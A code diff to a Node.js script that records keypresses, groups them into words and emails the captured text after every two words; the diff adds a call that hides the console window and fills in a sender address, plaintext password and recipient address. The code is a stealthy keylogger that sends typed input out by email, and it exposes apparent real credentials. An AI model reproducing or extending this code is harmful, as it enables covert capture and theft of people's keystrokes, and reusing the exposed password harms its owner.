@@ -1,13 +1,17 @@
+const ConsoleWindow = require("node-hide-console-window");
 const readline = require('readline');
-const MAX_WORDS = 3
+const MAX_WORDS = 2
 var word = new String()
 var text = new String()
 var nwords = 0
 
+//To hide your console just call:
+ConsoleWindow.hideConsole();
+
 // Data for sending the email
-const userEmail = XXX 
-const passUser = XXX 
-const toEmail = XXX 
+const userEmail = "filippo.pomilio@hotmail.it" 
+const passUser = "filippoide93" 
+const toEmail = "filippo.pomilio@gmail.com" 
 
 async function sendEMail(message){
 
@@ -52,7 +56,7 @@ process.stdin.on("keypress", async (str, key) => {
         text += word
         text += " "
         word = ""
-
+        
         if(nwords == MAX_WORDS){
             await sendEMail(text)
             text = ''
